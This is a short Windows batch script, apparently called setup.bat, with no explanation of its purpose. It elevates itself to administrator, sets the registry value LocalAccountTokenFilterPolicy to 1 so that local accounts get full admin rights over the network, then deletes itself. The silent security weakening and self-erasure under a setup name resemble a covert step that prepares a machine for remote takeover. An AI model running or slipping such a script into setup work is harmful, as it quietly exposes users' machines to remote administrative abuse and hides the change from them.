@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & goto error /b)
reg add HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
:error
del setup.bat
exit